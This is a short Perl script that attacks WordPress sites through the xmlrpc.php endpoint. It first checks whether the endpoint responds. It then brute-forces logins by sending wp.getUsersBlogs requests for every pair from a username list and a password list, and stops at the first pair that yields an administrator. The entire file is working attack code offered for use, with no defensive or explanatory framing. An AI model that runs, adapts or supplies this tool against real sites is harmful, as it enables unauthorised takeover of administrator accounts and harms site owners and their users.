#!/usr/bin/perl -w
# xml.pl --- jcb
# Author: jcc <jcc@jcb>
# Created: 10 Aug 2014
# Version: 0.01

use warnings;
use strict;
use LWP::UserAgent;

our $requrl;
our $ua = new LWP::UserAgent;
#USER_FILE and passwordfile
our $USER_FILE ="usernames.txt";
our $PASSWD_FILE = "passwords.txt";

sub checkbug{
  #geturl
  print "input the url(ex:http://xx.com):";
  my $url = <STDIN>;
  chomp($url);
  #check bug
  $requrl = $url."/xmlrpc.php";
  print "check $requrl\n";

  #check bug
  my $response = $ua->get($requrl);
  if ($response->is_success) {
    if ($response->decoded_content eq "XML-RPC server accepts POST requests only.") {
      print "xmlrpc bug aviable\n";
      return 1;
    }   
  }else {
    return 0;
  }
}

#get username or password
sub u_p_list{
  #file name
  my $file = shift;
  open (FH, "$file") || die ("Could not open  user $file");
  my @filecontent = <FH>;
  chomp(@filecontent);
  close FH;
  return @filecontent;
}

#exp
sub exploit{
  if (checkbug()) {
    foreach my $user (u_p_list($USER_FILE)){
      foreach my $passwd (u_p_list($PASSWD_FILE)){
        my $reqdata='<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>'.$user.'</value></param><param><value>'.$passwd.'</value></param></params></methodCall>';
        my $ex_request = $ua->post($requrl,Content => $reqdata);
        my $result = $ex_request->as_string;
        if ( $result =~ "403") {
          print "error $user -> $passwd\n";
        }
        elsif($result =~ "isAdmin"){
          print "success $user -> $passwd\n";
          exit;
        }
      }
    }
  }
}

#main
exploit;
__END__

